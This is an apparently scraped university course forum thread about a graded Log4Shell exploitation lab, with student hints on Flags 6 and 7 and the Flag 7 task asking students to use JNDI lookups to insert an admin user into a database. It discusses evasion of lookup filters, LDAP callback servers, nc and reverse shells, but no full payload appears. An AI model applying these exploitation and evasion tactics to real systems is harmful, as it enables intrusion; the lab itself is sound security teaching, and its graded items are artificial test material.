I don't know  what exactly I did differently, but I got it! I think I was relying on some of the other evasion tactics we used earlier, but they weren't necessary/hindered this exploit. 


5
Reply

Joseph A Cannaday
2w
 Replying to Arianna Rachel Lanz
Thank God you said this. 11+ hours on one flag and it was something so trivial. I hate my life.


2
Reply

Michael Derryberry
2w
 Replying to Joseph A Cannaday
I've been at this flag for so long now and I'm just going in circles. Even after sleeping and coming back the next day I'm still against a wall. Do you have any tips or hints that might be able to help?


Reply

Joseph A Cannaday
2w
 Replying to Michael Derryberry
Look at the logs to see how a lookup might be constructed and see Arianna's comment about evasion tactics. That's all I can say.


2
Reply

Anonymous Penguin
2w
 Replying to Joseph A Cannaday
Thanks a lot! I would say that it really doesn't make sense if  you are doing it right cause it's really making the exploit :( lost hours on this when it was working correctly just because I sent a different jndi payload


Reply

Robert Smithers III
1w
 Replying to Arianna Rachel Lanz
This solved it for me too! Not sure why a valid payload fails with evasion... likely some grading regex. Cheers


1
Reply

Michael Joseph Hearn
1w
 Replying to Robert Smithers III
Ahh yes we love when the grader failing means hours of extra work. 


3
Reply

Robert Birk Hughes
1w
 Replying to Robert Smithers III
So you just had to change the method in which you evaded the lookup checks and it worked for you?


Reply

Christopher Troupe
1w
 Replying to Arianna Rachel Lanz
I can't believe I wasted 5+ hours on this and this was the issue. Thank you! For anyone else, please save yourself your sanity and look at Arianna's comment. 


Reply

Van Hien Tran
5d
 Replying to Arianna Rachel Lanz
Hi, I still don't get it. I think I know how the payload should be based on the POST log, just not sure if I need to make it like how we passed it to the header in Flag 2. Sorry, English is not my mother tongue so i might misinterpreted the evasion tatics ... could you point to which flag using it?


[UPDATE] i got it thanks


Reply

Himanshu Singh
2d
 Replying to Van Hien Tran
What did you do? I'm constructing the payload through the POST logs but I am not sure how to retrieve it..


Reply

Himanshu Singh
2d
 Replying to Himanshu Singh
I got it, nevermind.


Reply

Abhishek Sathiabalan
2w
 Replying to Abdelrahman Ibrahem
Thanks, that made it click.


Reply

Amr Khaled Hassan
7d
 Replying to Abhishek Sathiabalan
Wow! This really was the issue after all


Reply

John Wyatt Gamble
3d
 Replying to Amr Khaled Hassan
This flag got me like:



1
Reply

Amrut Bhalchandra Kulkarni
5h
 Replying to John Wyatt Gamble
Just got Flag 6 and... y'know... same

I was doing roughly the same thing for a few hours, and I apparently changed something correctly since the flag showed up

Also, Between POST and GET, the random change meant that instead of the exploit being called 8 times per endpoint call, it would only be called 2 ties per call

So... still not sure... the logs look the same, but how I formatted the payload changed


Reply

This comment was deleted
Keymer Botero
2d
If your servers aren't firing, it means that your exploit is not getting triggered. Look into different ways how you can make that bad boy fire!

This may sound obvious, but trust me, this hint was a lifesaver thoroughout the project timeline for me.


Reply



FLAG6-END

FLAG7-Start

---TASK-START

FLAG 7 (Extra Credit): SQL Attack Authorization Persuasion (2 Pts)
Make sure you have gone through the Setup and Intro sections.

If you haven’t already, run the start script in the home directory of log4j user, start the container with the start script:

  ./StartContainer.sh

The endpoint for this exploit can be called and inspected via:

curl -X "DELETE" 'http://localhost:8080/rest/users/user/<id>' -H "GATECH_ID:123" -H "X-NetworkUserId:MWAD10"

This endpoint is used to delete users from the system database. Only users with admin access (ADMIN_YN = ‘Y’) are allowed to perform this task. You can call the list of users (/users/all) to experiment with this.

In this flag, you will use what you have learned and do something much more nefarious than the previous flags. You will need to use the log4shell exploit to execute an SQL attack and insert a user into the database, such that when the application authorizes the user it returns true and allows a delete.

The userName you must use is EDBOY, you must set the userRole to HOW_DARE_YOU_MOCK_THE_SON_OF_A_SHEPHERD and you must set adminYN to Y to achieve this flag.

Everything you need to achieve this task is logged in one of the 2 log files somewhere. Dissect the log file thoroughly as you will need to do more than just “inject” an sql string. Keep in mind that log4shell does not allow you to interact with the program’s state itself, only execute arbitrary code at the level of access the vulnerable program itself is running on. This means that this will not be a typical SQLi attack where you are exploiting the applications’ queries via injection. In fact, you will not actually interact with the applications sql queries at all. You will need to think outside of the box on how to do this .

Upon success, you should see your output similar to that below: Log file showing TRACE from BasicBinder.java binding a parameter as VARCHAR, INFO from RequestInterceptor.java revealing the flag, and DEBUG from SqlStatementLogger.java displaying an SQL SELECT statement

Hint: Look in the logs for information on the database, the schema, and what could be useful for this attack. You will not need anything outside of the java standard library for this attack.

Hint 2: You will need to leverage one of the previous flags’ curls to get the keys to unlock this flag.

Your flag could be invalid if you have not sent your GATECH_ID appropriately in the published message. *** **IF THIS FLAG COMES OUT BLANK, Restart container by running the stopContainer and startContainer scripts in the home directory of the log4j user. *****



----TASK--END

Skip to main content
Logo
CS 6035 O01, OCY
–
Ed Discussion

2

New Thread
Courses
56
35
Categories
576 others online
Use left and right arrow keys to adjust the split region size

New Thread
Filter
Use left and right arrow keys to adjust the split region size
Project Log4Shell - Flag 6 Restful Data #697
Kevin Darlington
2 weeks ago in Projects – Log4Shell

Pinned

Star

Watch

532
55
33
22
Views

1
This is the post for discussing this flag. If there's any update on the task, we'll post it here. Please, do not open new threads covering this task.

Anyone with questions about citations and plagiarism should consult the appropriate section of the course policy on misconduct.

Note: Do not share code, outside tools you used or any hints beyond the writeup or office hours to other students. We will delete threads and warn you if you overshare.

Comment

Sort by Newest 
Anne Mary Shea
13m
Unresolved
I am to the point where I am past the teapot message, my LDAP and python servers are hitting, and in the console log it is showing the "Entering Exploit." message. I receive an error saying "Valid product.id not found inin config.properties."

I reset my exploit code to try nc to see if there was a value placed for product.id, but I do not receive the "connection received" message.

Did anyone else run into this/have troubleshooting advice?


Reply

Keymer Botero
2h

Resolved

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA I DID IT, AFTER A STRAIGHT WEEK, I GOT IT!!! 
I swear, there were teapot messages that were getting in my way before that SOMEHOW weren't present! It's as if the problem itself finally threw me a bone AND I DID IT!

Thank you everyone on this thread, it's been an emotional journey throughout this lab and I'm so happy to have finally made it. For those just making it here, definitely read this thread. At this point, there are some helpful pointers that can help point in the right direction


1
Reply

Keymer Botero
2h
OH AND BEFORE I FORGET, YES DERP REALLY SAVED THE DAY FOR ME.

DO NOT PILE ON MULTIPLE EMPTY ENTRIES, YOU WILL LEAVE YOURSELF TRAPPED FOR DAYS


Reply

David Jaffie
3h
Unresolved
Has anyone figured out the "Flag not obtained due to failed attempt, the customer.service.email property is not in config.properties OR overwriting file instead of updating it."

I thought we just had to set product.id? Why is it asking about customer.service.email?


Reply

Keymer Botero
3h
Oh don't worry, This was something that Kevin and Joel mentioned. They forgot to update, so our job is actually to append the product.id of the malicious product into the config.properties.


1
Reply

David Jaffie
2h
Hm okay. I believe I am appending product.id, but I still just get the same customer.service.email warning. May just be a red herring.


1
Reply

Anh T. Le
4h

Resolved
Definitely, not an easy one...
If i'm giving out too much please delete this message. 
Confirm that there is no need for obfuscating. Look at the Log for POST something is definite in there that you can use, but also check what GET gives using all the endpoints.  


1
Reply

Keymer Botero
3h
I agree, although I'm stuck. I won't pry for details as that would go against policies established by TAs but I am definitely curious as to how you get the teapot messages if you did not need obfuscation.  


Reply

Anh T. Le
2h
Look at log for POST as other mention.

Try something like silly sillier silliest outofspacesilly like the TA mentioned.

There is one spot will stand out in Post log. 

Dont move to get until you spot that Log.

Thinking about buying car to modify the post curl what do you need to know abt the car.


1
Reply

Keymer Botero
2h
 Replying to Anh T. Le
Anh, I swear it right now, this post really saved me. I thought was gonna be websec all over again where my exploit DID perform what was required, but the flag generator just did not want me to get the last bit of points. 

The moment I found that spot, I was like HUH??? The funny part is, I could have sworn there were teapot messages saying otherwise, but there was not! Thank you so much Anh.


1
Reply

Joshua James Holder
7h

Resolved
Just a heads up, if you think you have everything right and it's still giving you the data at rest error, stop and start your container again. 

I had my payload good for two hours today and I was banging my head against the keyboard making slight tweaks. Then, I stopped/started the container, entered the same commands, and it gave me the flag. 


1
Reply

Sukhman Kaur
7h

Resolved
I am really struggling to get the exploit to even trigger. I used post and injected it somewhere there and can see it when calling another endpoint but it seems like its just as a string and never gets executed... does anyone have any helpful hints on what I could be doing wrong. Is the exploit supposed to trigger at post and get? mine is not triggering at either :(


Reply

Jason Clement Liu
7h
I found that the Office Hours #2 was very informative and would highly recommend you check it out. As others have stated before, this flag is about information at rest. Read the logs for each endpoint and understand where information is being stored.


1
Reply

Amrut Bhalchandra Kulkarni
7h
That's what I'm struggling with rn
I have a payload in POST that should work, but I'm trying to find a way to access it to run during GET


Reply

Jason Clement Liu
7h
 Replying to Amrut Bhalchandra Kulkarni
Make sure to check all the endpoints to see which would be the best method of exploiting your POST.


1
Reply

Amrut Bhalchandra Kulkarni
8h
Unresolved
I think I know which GET it is, but there's a vector there that I'm not sure how to populate
My exploit is in the db because of POST, but I'm not sure how to access it in GET


Reply

Keymer Botero
8h
Hey Amrut! I believe I know which one you are referring to. Be sure to note where everything is being logged when you are using that endpoint and see what's getting returned to you.


Reply

Amrut Bhalchandra Kulkarni
7h
I can see where all my POST info was logged, but I'm trying to access it so I can use it in GET


Reply

Amrut Bhalchandra Kulkarni
9h

Resolved
Did anyone else's LDAP ping when they executed their POST?

Since the GET is what's supposed to trigger it, idk if that's a good thing or not


Reply

Jason Clement Liu
7h
My LDAP server triggered when running my POST. Others below have reported that theirs did not trigger. I'm not sure, but I suppose that means it can be done in multiple ways.


1
Reply

Amrut Bhalchandra Kulkarni
9h

Resolved
I think I found the pattern in POST some folks have mentioned, but when I'm testing that theory, I get an error saying "IP Address pattern detected in request body. Aborting."

Any tips to avoid this?

Edit: Figured it out... and it was easier than predicted

Edit2: Checking the logs, the syntax for the pattern is messing up my attempted fix

Edit3: Found another simple fix that works; at least the syntax is what I'm used to seeing from other flags


1
Reply

Amrut Bhalchandra Kulkarni
10h

Resolved
I'm honestly very lost

I know that the data-at-rest component of this means our exploit is sent to the db with our malicious product, and I found a variable in one of the other endpoints that looks like it can be used for the main attack once our malicious product is called via GET.
I'm not entirely sure what to add to the malicious product and how it should interact with the other endpoints or how it would grab the id of the malicious product and pass that onto the other endpoint when the exploit is called.

Do we need multiple calls to the ldap using obfuscated exploit strings?


Reply

Keymer Botero
10h

Resolved
Alright, I am here to report mixed news. After much review, I have tweaked my approach to use as minimal obfuscation techniques as possible. However despite this, the section where the flag SHOULD appear is not visible in any way. This happened twice yesterday on my VMware setup on my desktop and now again on my laptop. Despite restarting the container each time and restarting the VM itself as well, I am met with the same pitfalls. Is there any way anyone could offer there insight in this matter?


Reply

Anonymous Alligator
11h

Resolved
I'm still a bit stuck.


If i'm getting the issue telling me that I need to make sure that the data is at rest, how do I discern this from the data actually not being at rest, or an issue within my obfuscation?  I've seen other comments mentioning that over-obfuscation can also cause the same message.


Additionally, is it required to leverage any other endpoints other than the 4 presented in the write-up for flag 6?  Say an endpoint from another flag?


Reply

Matthew David Macioce
10h
You don't have to leverage any endpoints other than the ones given in the write-up. I would take a listen to the office hours recording. Joel had a great point about obfuscating around the 29 minute mark. That combined with really looking for patterns/something off in the logs - should lead you in the right direction (I know that's frustrating as I'm sure you've been looking at the logs) but to Kevin's point, put in silly strings and see where they all get logged. Combining all of the tips really helped me get this flag 


Reply

Aniketh Swain
22h

Resolved
So I have inspected the logs from the POST, I see the very cool pattern to exploit and so I built my curl accordingly. But when I call the relevant GET to see if I am even able to trigger the ldap request from the data fetched, I don't see any print statements that I have in the Exploit.java file. I am checking the console.log file. Any thoughts/suggestions? I am avoiding the teapot issues so that shouldn't be an issue

Edit: Got the flag!! Ended up having an incorrect endpoint usage


Reply

Fahim Sunka
20h
Nice work! Marking resolved.


Reply

Cliff Chao
22h

Resolved
I recommend you don't start exploiting until you fully understand how to utilize the POST method, as everyone has said, the logs are the key.  There is something suspicious in there, but once you find it, it should be a EUREKA moment.. Fairly straightforward once you understand the logs.


3
Reply

Fahim Sunka
22h
Good point, in general for the flags, carefully examining the logs for hints and entry points will help significantly.


1
Reply

Yau Ming Kwan
1d

Resolved
Finally made it till the end! It's been a really tough week spending hours to get flags 1,2 and 4 and got so stuck in flag 3. Finally got flags 3, 5 and 6 in one go, inspecting the logs carefully is really the way to go.

LIGHTWEIGHT BABY!


2
Reply

Yau Ming Kwan
1d
Link to the office hour video for those who are still struggling: https://gtvault.sharepoint.com/sites/Course_cs_6035_o01_ocy-K4AbX3NT4s6GC/_layouts/15/stream.aspx?id=%2Fsites%2FCourse%5Fcs%5F6035%5Fo01%5Focy%2DK4AbX3NT4s6GC%2FShared%20Documents%2FOffice%20Hours%2FRecordings%2FLog4Shell%20Office%20Hours%20%5F2%2D20250304%5F185651%2DMeeting%20Recording%2Emp4


Reply

Matthew David Macioce
1d
Watching the video - I have input some strings into my POST call, I see where they're being logged, I guess I am just struggling how to use it to input my jndi, really no matter which one I use I seem to either trigger the teapot error (with no obfuscation), and if I use some obfuscation to get passed it, nothing happens on the servers. I can't tell if I am just using the wrong vector or too much obfuscation - I am guessing based on the comments in office hours though, I won't need to obfuscate/encode?


Reply

Anonymous Badger
1d
 Replying to Matthew David Macioce
Same thing happening to me, <redacted> but now the ldap server is not firing even though i see the exact correct malicious trigger logged after the GET call


Reply

Matthew David Macioce
1d
 Replying to Anonymous Badger
Yeah, I wasn't sure about that variable (assuming I am thinking of the same variable you're thinking of lol), I was just trying to input the jndi in different places in the POST command 


Reply

Anonymous Badger
1d
 Replying to Matthew David Macioce
Im talking about <redacted> but my server is not firing even though i can see the same valid trigger i have always used being logged


Reply

Joel M Tucker
1d
 Replying to Anonymous Badger
Watch the oversharing 


1
Reply

Anonymous Badger
1d
 Replying to Joel M Tucker
Apologies, was trying to be vague while still distinguishing from other potential red herrings


Reply

Joel M Tucker
1d
 Replying to Anonymous Badger
Not vague enough, calling out specific strategies using specific attack vectors is a bit much


Reply

Anonymous Badger
1d
 Replying to Joel M Tucker
Noted. Sorry about that


Reply

Michael Ryan Boling
1d

Resolved
I have found a pattern in one of the logs of one of the endpoints where, if the POST payload is constructed correctly, this pattern can be used to form the same malicious trigger that has been working for previous flags. I successfully do this and see the same trigger printed, but now my ldap server isn't firing? I am almost certain I am using the right strategy here (based on this thread https://edstem.org/us/courses/69023/discussion/6222726?comment=14562148 and other hints) but this is stumping me. I have triple checked for syntax errors already and this exact same trigger has worked for me in every other flag.


Reply

Yau Ming Kwan
1d
It should fire when you POST and fire again when you GET, which gives you the flag. Try not to obfuscate if it is not firing.


1
Reply

Michael Ryan Boling
1d
How would it fire when we POST? Wouldn’t that require you to set an entire field of the POST to the trigger instead of forming it to format correctly when they log their internal variable in the GET?


Reply

David Robert Nygren
1d
This is the hint I needed. Thank you.


1
Reply

Anonymous Badger
1d
 Replying to David Robert Nygren
Which hint? I am still unable to figure out why it's not firing


Reply

David Robert Nygren
1d
 Replying to Anonymous Badger
That it should fire after POST. If it's not doing that then my curl is probably incorrect. (I'm sure there's a way to do it without POST firing but knowing that it will work also if it DOES is nice to know for testing purposes). Of course, none of that will get the flag until you send the get but


1
Reply

Rakshaa Ravishankar
1d
 Replying to David Robert Nygren
I'm able to fire the LDAP iwth my POST but not any GET. am i on the right track or did I obfuscate too much>


Reply

David Robert Nygren
1d
 Replying to Rakshaa Ravishankar
I haven't got that far yet so I'm not sure haha. Sorry


Reply

Yau Ming Kwan
1d
 Replying to Rakshaa Ravishankar
Be sure you are with the correct attack vector. It’s quite obvious when you find it, and then you construct the payload to post.


Reply

Rakshaa Ravishankar
1d
 Replying to Yau Ming Kwan
I thought I found it, because it sets another variable to the same lookup in the logs. but when i try any of the GETS I get the data at rest error


Reply

David Robert Nygren
23h
 Replying to Yau Ming Kwan
I know the attack vector and can send jndi payloads through, but none of them trigger the LDAP after POST (I'm not expecting the flag at this step ofc). I think I'll take another crack at this tomorrow. I've tried no obfuscation (gets blocked), encoding, etc and nothing worked yet so we trek on later...


Reply

Yau Ming Kwan
19h
 Replying to David Robert Nygren
If you tried no obfuscation and it didn’t work out, you are probably not with the correct attack vector. Think about what is being logged, not what is being stored in the database (which will not trigger the lookup anyways).


1
Reply

Meer Ushter
2d

Resolved
So I am stuck at pretty much how others have posted on the thread ,

I am able to send my jndi through the post request (It did execute on post )
and I was able to get the jndi trigger by one of the get endpoint I can see the product.id as i have added print statement and saw it was added ,

But I still get "WARN Flag not obtained due to failed attempt. JNDI malicious trigger must come from data at rest"

I think it is coming from the data considering its part of the payload (hopefully i not revealing too much)
but even with dialing down the obfuscation I am still getting that. 

please any help on what i could try would be great I know im super close (i think )


1
Reply

Joel M Tucker
2d
Not a whole lot more help that we can give that we already haven’t in this thread and the office hours. But you’re close, keep at it!


1
Reply

Michael Ryan Boling
2d
same here


Reply

Meer Ushter
2d
I do see one of the patterns on the binding i wonder if theres something i can do i tried adjusting the payload  to match that pattern so far same issue .


1
Reply

Anonymous Badger
1d
I also found the pattern and I have constructed the payload so that when i send it their internal value will print the malicious trigger (based on this hint https://edstem.org/us/courses/69023/discussion/6222726?comment=14562148) but now the ldap server isn't even firing even though their internal variable is printing my exact trigger I have been using to solve previous flags


Reply

Meer Ushter
21h
 Replying to Anonymous Badger
so far i am using that pattern but still stuck on the same stuff 


Reply

Meer Ushter
19h
NVM got the flag , 
i guess my issue is i needed to use all of the payload and make sure how the payload is set to match your stuff , tbh i didn't even need to obfuscate  at all maybe just encode, you will know what i mean once you create that payload , there was one of the comment below that hinted, Its going to be one hell of a crazy car !


Reply

Rakshaa Ravishankar
2d
Unresolved
Does the data at rest warning mean I have at least set the malicious field with the lookup correctly? I got to the teacup message then changed one thing and the post was successful.  I see the LDAP and python server being triggered successfully too. When I attempt the diff GET requests it looks like my lookup is being retrieved from data at rest but I am still not getting the flag. Is it possible my obfuscation was too much? not sure what I'm missing here.


2
Reply

Amrut Bhalchandra Kulkarni
5h
I'm currently seeing the same error, and I used printlns to confirm that product.id did exit and it was set to the id of the malicious product


Reply

Matthew David Macioce
2d

Resolved
Running into the issue of my servers not firing, I am getting passed the teapot error though, is it safe to assume my issue is over obfuscating? I can use the GET calls, but I don't see the servers firing 


1
Reply

Bryan Curl
2d
This is where I'm at as well.


1
Reply

Joel M Tucker
1d
Take a look through the thread, this is a common one. 


1
Reply

Matthew David Macioce
1d
 Replying to Joel M Tucker
Thanks, some of the comments confused me a bit, but looked it up and seem to have my answer, appreciate it!


1
Reply

Joel M Tucker
1d
 Replying to Matthew David Macioce
awesome!


Reply

Andrew Naughton
2d

Resolved
Just got this after struggling for a couple of days. The hints in this thread are great. I'll stress that you really need to investigate the responses you get. 


1
Reply

Gantabya Kadel
2d

Resolved
Got the flag. 
Advice for folks who are stuck: pay close attention to the logs, how you are passing in that payload and even closer to how you are performing that GET. I spent all of yesterday being confused by a red herring and that too because I didn't pay attention to how I was performing my GET and why the "search" didn't "find" what was obviously there. 


1
Reply

David Robert Nygren
2d

Resolved
On one of the endpoints, I notice a random variable that, using a query, I can print plaintext to (Like in a previous flag). Is this supposed to be a distraction? 


Reply

Gantabya Kadel
2d
As mentioned down in the threads, you have more that one attack vector here but the key point is that, as mentioned in office hours, you need to get the exploit from data at rest. If you look further down in the threads, they even tell you the right sequence of reqs to make.


Reply

David Robert Nygren
2d
I know I won't receive the flag when I send in the malicious POST (thats for later at rest ofc), but should it trigger my LDAP anyway?


1
Reply

Gantabya Kadel
2d
Endorsed
 Replying to David Robert Nygren
well think about it ... all of them will trigger it the point is to use the correct one. Joel mentioned this in office hour yesterday if you watch it.


1
Reply

Cliff Chao
22h
There are a couple of red herrings in this assignment.. Once you find the attack vector it should be fairly apparent.


Reply

Michael Ryan Boling
2d

Resolved
I have obfuscated only just enough to bypass the teapot (I know this because I did multiple iterations of barely adding to the obfuscation). Additionally, I am using data at rest to inject the trigger and see that the exploit has been triggered based on logs. I am following the directions of what to do within the exploit. However, I am still getting the error: "Flag not obtained due to failed attempt. JDNI malicious trigger must come from data at rest." I'm not sure what I'm missing here? I have followed the directions closely and I am certain the trigger is coming from data at rest 


Reply

Keymer Botero
2d
Hey Michael! On the same page with you. This part of the writeup might help clear some confusion:

Note: You will have to trigger the LDAP call with the malicious record in order to generate the Flag.

I'd definitely recommend taking a look at what kind of call you are using.


1
Reply

Michael Ryan Boling
2d
Hey Keymer, thanks for the response! I have created the record with the POST endpoint and injected the malicious trigger to one of the fields. I then use the GET endpoint that gets products by that same field because when I do that it logs the contents of the product (meaning it logs the trigger I injected). I am now at the point where I no longer see the "must come from rest data" message, I just see the a log that the product was found, followed by its information (including the malicious trigger). However, no flag was printed. I'm a bit confused as to what's happening now because there's no more warnings but also no flag. All servers are firing, bypasses working, exploit being triggered, and I followed direction for what to do within the exploit, so really not sure what I'm missing at this point.


Reply

Sean Kenneth Weber
2d
 Replying to Michael Ryan Boling
I call the email endpoint, and the exploit is performed with data at rest. I have proven that the config.properties file is being updated as well. No clue what is going on...


1
Reply

Michael Ryan Boling
2d
 Replying to Sean Kenneth Weber
Same here, and I don't know how it could be over-obfuscation because I change one thing from when the teapot protected it to barely get it to bypass the teapot


1
Reply

Keymer Botero
15h
 Replying to Michael Ryan Boling
Wow, I’m literally doing the same thing too, but maybe there’s a way to even less obfuscation. I’ll take a look later today because I’ve followed through the same logic and still no flag.


Reply

Amrut Bhalchandra Kulkarni
6h
 Replying to Sean Kenneth Weber
I'm in the exact same situation rn
I passed my obfuscated payload into one of the fields in POST, and the email GET logs the payload, triggers the LDAP, but I get the "needs to be from data at rest" error

Other people have obtained the flag from the email endpoint, so I feel like I'm very close


Reply

Anonymous Llama
2d

Resolved
Well this was an annoying mistake, but reminder it's "jndi" not "jndp" :D


1
Reply

Kevin Darlington
2d
Ha! These errors are more common than you think! Nice work!


1
Reply

Keymer Botero
2d

Resolved
Just figured I’d repost my question here since my original post got buried I assume.

UPDATE: So close! Just got this message 

2025-03-05 03:42:44 [ProductService.java:73] WARN Flag not obtained due to failed attempt. JNDI malicious trigger must come from data at rest

I swear I feel like I'm so close but I can see why this would not be considered Data at rest since I'm TECHNICALLY using the GET to do something for me... 

The thing that confuses me is that I’m not the one technically putting it together (if TAs know what I mean), despite the warning message implying that it is.


Any advice or idea how close I actually am? Or maybe there’s something I’m perhaps overlooking. 


Reply

Keymer Botero
2d
Considering something that I'm going to test. Similar how we had to utilize the properties file before in a previous flag, I'm noticing that my product.id is not getting read when running the requests over and over. I only seeing the usual customer.service.email, topic.name, and rating. Is this related to how we should proceed?

NOTE: I am only aware that altering customer.service.email is not a requirement for this flag. 

Just noticed this part of the write-up that may have been mentioned previously but I feel its important to mention:

Note: You will have to trigger the LDAP call with the malicious record in order to generate the Flag.

EDIT: New question among my other questions:
I'm noticing my product.id getting logged multiple times. As Kevin mentioned during Office Hours, I know we need to append it as the writeup was intended to have this detail but does not at the moment. Would that be a problem though if it were logged multiple times?


Reply

Keymer Botero
2d
Just as an update to where I'm at, I found out the pattern left behind in the logs when POSTing to the server and now I also noticed a parameter when trying to trigger the LDAP call with the malicious record. 

Just to make sure I'm narrowing down my options, is that something we can leverage? I feel like I used everything I can with and still nothing. Insight/Advice would be very much appreciated in the matter.


1
Reply

Anonymous Badger
2d
are we not supposed to put the trigger in one of the fields of the POST call and then use a GET call (by that same field) to get that record?


Reply

Keymer Botero
2d
 Replying to Anonymous Badger
That's what I'm trying to do and I've performed other variations and still no luck. I swear, I feel like I've tried everything BUT the one solution that works. There's probably way more I'm not seeing but man, this flag knows how to put up a good challenge.

Been using roughly the same java payload as flag 3 & 5 and made sure to compile each time before I fire it away. 

EDIT: Just going to tune off again for work tomorrow. If anyone has any nuggets of wisdom to share, it would be greatly appreciated. Here's what I know from the writeup, comments on this thread, and from Office Hours:

Data At Rest refers to the data being stored somewhere and not actively being used. In the context of this flag, we need to stash our ldap call inside the server somehow

There's a vulnerable pattern when posting. I won't say exactly what it is but you can use it to your advantage. Be as creative as you can with it but make sure not to overdo the obfuscation.

Recall that the writeup has yet to be updated. We need to find some way to append the malicious record as 'product.id=<MALICIOUS_RECORD>' and make sure that it persists.

The customer.service.email is not relevant to this flag. As Joel mentioned, it is a red herring.

As mentioned in the hint 
"Note: You will have to trigger the LDAP call with the malicious record in order to generate the Flag." If you use the wrong call, the flag will not generate.

I know I've mentioned this a ton, but I am sincere with it, any tips/advice are massively appreciated.


1
Reply

Anonymous Badger
2d
 Replying to Keymer Botero
is the whatDoIDo also a red herring?


Reply

Keymer Botero
2d
 Replying to Anonymous Badger
I'm trying to narrow that down, so I'm not sure to be honest..😔


1
Reply

Claudia Araceli Garcia
2d
 Replying to Anonymous Badger
Also wondering the same 


3
Reply

Joel M Tucker
1d
 Replying to Keymer Botero
Between office hours and the thread, there isn't a whole lot left to give. You're close! Taking a break is a good idea when you get to stops like this


1
Reply

Matthew David Macioce
1d
 Replying to Joel M Tucker
My two cents (probably wrong) but my understanding is that it probably is a red herring because if we have to append a jndi to that variable that would not really be using data at rest, I think? I feel like we are simply (relative here lol) supposed to use one of the GETs supplied to us and that will trigger our jndi that we included in the POST when we created a new record

again, this could be off-base just my current thoughts while trying to work through this problem


Reply

Cosdyn Akers
1d
 Replying to Matthew David Macioce
I agree with this take on the parameter.  I spent a few hours playing around with it, there really isn't a good way to abuse it for our intents and purposes


1
Reply

Keymer Botero
1d
 Replying to Cosdyn Akers
Are you two sure? Because when retrieving values, it has to follow the concept of 'Data at rest'. Yes, the exploit has to come within the database, but also utilizing the suspicious parameter given and leveraging that with the pattern found when posting should theoretically perform the same Data At Rest exploit as it is something that is by the server, rather than us directly performing the needed ldap call. 

EDIT: I bring this point only because I've tried utilizing the given pattern from the POST, utilized the email endpoint described in the writeup, and the ID endpoint and still nothing. I've already posted about both errors and I can see the inner workings of both and why certain things are happening. Although the following hint mentions:

"Note: You will have to trigger the LDAP call with the malicious record in order to generate the Flag." If you use the wrong call, the flag will not generate.

Using this hint, we can narrow our search which is why I'm lead to believe this suspicious parameter is something of interest.


Reply

Rakshaa Ravishankar
1d
 Replying to Keymer Botero
I think I'm at the same place as you - my POST triggers the LDAP and I see a variable being populated with the lookup, but none of the GETS give the flag even though they spit back that value with the lookup. Isn't that what data at rest is supposed to mean, or am I wrong?


Reply

Rakshaa Ravishankar
1d
 Replying to Rakshaa Ravishankar
also, the office hour said for the data at rest error, potentially obfuscation causes an issue for it to be able to be triggered through the logs. But we do need some obfuscation in the first place for the POST to work, so that is why I am stuck.


Reply

Keymer Botero
1d
 Replying to Rakshaa Ravishankar
Noted. Perhaps there's even less obfuscation I can do. Or different way.


1
Reply

Rakshaa Ravishankar
1d
 Replying to Keymer Botero
that's what I'm looking into as well.


Reply

Matthew David Macioce
11h
 Replying to Keymer Botero
Sorry just saw this reply, Idk for certain if it's a red herring, but FWIW I was able to find the flag without using that variable 


Reply

Keymer Botero
11h
 Replying to Matthew David Macioce
Thank you so much Matthew, this is actually huge. Honestly, I feel like I understand the general concept Joel and Kevin are imparting on us regarding this flag. I think at this I need to somehow obfuscate even smaller parts of the exploit, even I'm using just enough to get past the teapot messages. I hope I can report back with something more positive but at very least, it's like the ol' saying 'It ain't over til its over.'


1
Reply

Keymer Botero
1d
I swear I'm on the edge of my seat here

2025-03-07 00:04:21 [ProductService.java:76] WARN Flag not obtained due to failed attempt. Valid product.id for product not found inin config.properties.

Just to make I'm on the same page, the product.id is just the actual ID of the product right? There's no required appended text or prefix that I am missing here? I can confirm that I am spelling 'product.id' correctly. When reversing shell connection to target, I can confirm that the format has been followed, no extra spaces and so far. Still testing but will report back when I finish checking through my results. 

EDIT: Back to the same error 😟:

2025-03-07 00:11:13 [ProductService.java:73] WARN Flag not obtained due to failed attempt. JNDI malicious trigger must come from data at rest


Reply

Keymer Botero
1d
Update: Tested what I could, nothing in my known bad actor list triggered that intriguing warning message.. I'm going to shutdown my VM client this time, rather than suspend and try again tomorrow. If anyone has something to offer with my previous questions, it would be greatly appreciated. I know I'm so close and I understand the proper assembly, but this flag man..  This post is getting really long-winded so will make a new one tomorrow if I have any more spoiler-free findings or questions.


Reply

Rakshaa Ravishankar
22h
I got the same error for valid product id not found, do you think that's further along or going backward?


Reply

Keymer Botero
12h
 Replying to Rakshaa Ravishankar
I think this error comes up when either the product.id is not appended into the config.properties file or if the product.id does not relate to a malicious record.

Just had an idea though, is the SQL behind the screens 'putting the pattern together'. The writeup mentioned using the appropriate GET endpoint but I'm trying to be as open as I can with other possibilities.


Reply

Cheng-Kai Zhang
2d

Resolved
I am kind of not sure it's me doing the wrong way or something else goes wrong...

i first use method 1 to exploit, and see the data at rest warning

Now I try to follow the author intention, fill in the way i think it want me to, through the screen I feel I do it right, but the server become extremely slow, GET and POST request need ~5 minutes to finish and my exploit didn't be triggered


Reply

Cheng-Kai Zhang
2d
interesting... finally got the flag and the frozen behavior seems due to the logic in server side. It turns out my input has minor error and once I change that it immediately run smoothly


Reply

Ashutosh Agarwal
2d
Nice work!


Reply

Shabiha Sultana Setu
3d

Resolved
I'm getting confused about the triggering process. If I send via email it says should be triggered via LADP but which parameter should I look for?


Reply

Joel M Tucker
3d
We covered Flag6 quite a bit in the office hours last night. Might help with this


1
Reply

Ramoya Grandison
2d
Has the link been posted? Not seeing it


Reply

Gantabya Kadel
3d

Resolved
I'm at a very confusing juncture. The emails I set look to be overwritten to default value when I get all the products. Then, if I try to get product by the email customerservice@gatech.edu 
the it just returns and empty []. I'm not sure what's happening here, could someone shed some light? Thanks.


Reply

Gantabya Kadel
3d
yup confirming, the email just auto changes to default regardless of what you place there.


Reply

Gantabya Kadel
3d
I have stopped and restarted the container several times but the email change doesn’t persist. I was actually able to query based on email prior to when I stopped the container first time around


Reply

Seth Hunter Hemphill
3d
 Replying to Gantabya Kadel
The email being changed might be a red herring. Post the example email they give you and see if you can query it regardless of if that example email appears different in the product list.


Reply

Joel M Tucker
3d
 Replying to Seth Hunter Hemphill
